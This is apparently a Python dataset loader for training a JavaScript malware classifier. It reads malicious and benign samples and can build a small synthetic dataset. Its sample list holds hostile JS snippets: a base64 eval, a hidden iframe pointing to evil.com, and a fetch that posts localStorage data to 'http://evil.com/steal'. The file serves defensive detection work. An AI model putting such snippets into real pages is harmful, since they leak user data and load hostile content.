"""
Dataset Loader for JavaScript Malware Detection

Loads malicious and benign JavaScript samples and prepares for training.
"""

import os
import sys
from pathlib import Path
from typing import Tuple, List
import pandas as pd
import numpy as np

# Add preprocess to path
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'preprocess'))
from feature_engineering import JSFeatureExtractor


class JSDatasetLoader:
    """
    Loads JavaScript malware datasets and extracts features.
    """
    
    def __init__(self, malicious_dir: str = None, benign_dir: str = None):
        """
        Initialize dataset loader.
        
        Args:
            malicious_dir: Path to malicious JS samples
            benign_dir: Path to benign JS samples
        """
        self.malicious_dir = malicious_dir or os.path.join('..', 'data', 'malicious')
        self.benign_dir = benign_dir or os.path.join('..', 'data', 'benign')
        self.feature_extractor = JSFeatureExtractor()
        
    def load_js_files(self, directory: str, label: int, 
                      max_files: int = None) -> Tuple[List[dict], List[int]]:
        """
        Load JavaScript files from directory.
        
        Args:
            directory: Directory containing .js files
            label: Label for these files (0=benign, 1=malicious, 2=obfuscated)
            max_files: Maximum number of files to load (None = all)
            
        Returns:
            Tuple of (features_list, labels_list)
        """
        features_list = []
        labels_list = []
        
        # Get all .js files
        js_files = list(Path(directory).rglob('*.js'))
        
        if max_files:
            js_files = js_files[:max_files]
        
        print(f"Loading {len(js_files)} files from {directory}...")
        
        for idx, js_file in enumerate(js_files):
            if (idx + 1) % 100 == 0:
                print(f"  Processed {idx + 1}/{len(js_files)} files...")
            
            try:
                # Read file
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    js_code = f.read()
                
                # Skip empty files
                if len(js_code.strip()) < 10:
                    continue
                
                # Extract features
                features = self.feature_extractor.extract_features(js_code)
                
                # Store
                features_list.append(features)
                labels_list.append(label)
                
            except Exception as e:
                print(f"  Warning: Failed to process {js_file}: {e}")
                continue
        
        print(f"✓ Loaded {len(features_list)} valid samples")
        return features_list, labels_list
    
    def load_dataset(self, max_malicious: int = None, 
                    max_benign: int = None) -> Tuple[pd.DataFrame, np.ndarray]:
        """
        Load full dataset with malicious and benign samples.
        
        Args:
            max_malicious: Max malicious samples to load
            max_benign: Max benign samples to load
            
        Returns:
            Tuple of (feature_dataframe, labels_array)
        """
        print("\n" + "="*70)
        print("  LOADING JAVASCRIPT MALWARE DATASET")
        print("="*70)
        
        all_features = []
        all_labels = []
        
        # Load malicious samples
        if os.path.exists(self.malicious_dir):
            print(f"\n[1/2] Loading malicious samples from: {self.malicious_dir}")
            mal_features, mal_labels = self.load_js_files(
                self.malicious_dir, label=1, max_files=max_malicious
            )
            all_features.extend(mal_features)
            all_labels.extend(mal_labels)
        else:
            print(f"\n⚠ Warning: Malicious directory not found: {self.malicious_dir}")
            print("  Please download dataset:")
            print("  git clone https://github.com/HynekPetrak/javascript-malware-collection.git data/malicious")
        
        # Load benign samples
        if os.path.exists(self.benign_dir):
            print(f"\n[2/2] Loading benign samples from: {self.benign_dir}")
            ben_features, ben_labels = self.load_js_files(
                self.benign_dir, label=0, max_files=max_benign
            )
            all_features.extend(ben_features)
            all_labels.extend(ben_labels)
        else:
            print(f"\n⚠ Warning: Benign directory not found: {self.benign_dir}")
            print("  Please download dataset:")
            print("  git clone https://github.com/google/security-corpus.git")
            print("  Copy js files to data/benign/")
        
        if not all_features:
            raise ValueError(
                "No samples loaded! Please ensure datasets are in:\n"
                f"  Malicious: {self.malicious_dir}\n"
                f"  Benign: {self.benign_dir}"
            )
        
        # Convert to DataFrame
        print("\n" + "-"*70)
        print("Converting to feature matrix...")
        X = pd.DataFrame(all_features)
        y = np.array(all_labels)
        
        # Summary
        print("\n" + "="*70)
        print("  DATASET SUMMARY")
        print("="*70)
        print(f"Total samples: {len(X)}")
        print(f"  Benign:    {(y == 0).sum():6d} samples ({(y == 0).sum()/len(y)*100:.1f}%)")
        print(f"  Malicious: {(y == 1).sum():6d} samples ({(y == 1).sum()/len(y)*100:.1f}%)")
        print(f"\nFeatures: {len(X.columns)}")
        print(f"Feature matrix shape: {X.shape}")
        print(f"\nFeature names (first 10):")
        for i, col in enumerate(X.columns[:10], 1):
            print(f"  {i:2d}. {col}")
        
        return X, y
    
    def create_sample_dataset(self, output_csv: str = '../data/sample_dataset.csv') -> None:
        """
        Create a sample dataset for testing (when real datasets not available).
        
        Args:
            output_csv: Path to save sample CSV
        """
        print("\n" + "="*70)
        print("  CREATING SAMPLE DATASET (For Testing)")
        print("="*70)
        
        # Sample malicious JS patterns
        malicious_samples = [
            "eval(atob('bWFsd2FyZQ=='));",
            "function decrypt() { var x = String.fromCharCode(112,97,121,108,111,97,100); eval(x); }",
            "setTimeout(function() { document.write('<iframe src=\"evil.com\"></iframe>'); }, 1000);",
            "fetch('http://evil.com/steal', {method: 'POST', body: localStorage.getItem('data')});",
            "var crypto = new WebAssembly.Module(); var payload = atob('...');",
        ]
        
        # Sample benign JS patterns
        benign_samples = [
            "function greet(name) { console.log('Hello, ' + name); }",
            "const x = 10; const y = 20; const sum = x + y; console.log(sum);",
            "document.getElementById('btn').addEventListener('click', function() { alert('Clicked'); });",
            "fetch('/api/data').then(res => res.json()).then(data => console.log(data));",
            "class Person { constructor(name) { this.name = name; } greet() { return 'Hi'; } }",
        ]
        
        # Multiply samples
        all_samples = malicious_samples * 20 + benign_samples * 20
        all_labels = [1] * (len(malicious_samples) * 20) + [0] * (len(benign_samples) * 20)
        
        # Extract features
        features_list = []
        final_labels = []
        
        print(f"Generating {len(all_samples)} sample features...")
        for js_code, label in zip(all_samples, all_labels):
            try:
                features = self.feature_extractor.extract_features(js_code)
                features_list.append(features)
                final_labels.append(label)
            except Exception as e:
                print(f"  Warning: Failed to extract features: {e}")
        
        # Create DataFrame
        X = pd.DataFrame(features_list)
        X['label'] = final_labels
        
        # Save
        os.makedirs(os.path.dirname(output_csv), exist_ok=True)
        X.to_csv(output_csv, index=False)
        
        print(f"✓ Sample dataset created: {output_csv}")
        print(f"  Total samples: {len(X)}")
        print(f"  Benign: {(X['label'] == 0).sum()}")
        print(f"  Malicious: {(X['label'] == 1).sum()}")
        print("\nUse this for testing when real datasets are not available.")


if __name__ == "__main__":
    # Test dataset loader
    loader = JSDatasetLoader()
    
    # Option 1: Try to load real datasets
    try:
        X, y = loader.load_dataset(max_malicious=100, max_benign=100)
        print("\n✓ Dataset loaded successfully!")
    except Exception as e:
        print(f"\n⚠ Could not load real datasets: {e}")
        print("\nCreating sample dataset instead...")
        loader.create_sample_dataset()
        print("\nTo use real datasets:")
        print("  1. Download malicious JS:")
        print("     git clone https://github.com/HynekPetrak/javascript-malware-collection.git")
        print("     mv javascript-malware-collection backend/ml_js_model/data/malicious")
        print("  2. Download benign JS:")
        print("     git clone https://github.com/google/security-corpus.git")
        print("     mkdir -p backend/ml_js_model/data/benign")
        print("     cp security-corpus/js/*.js backend/ml_js_model/data/benign/")
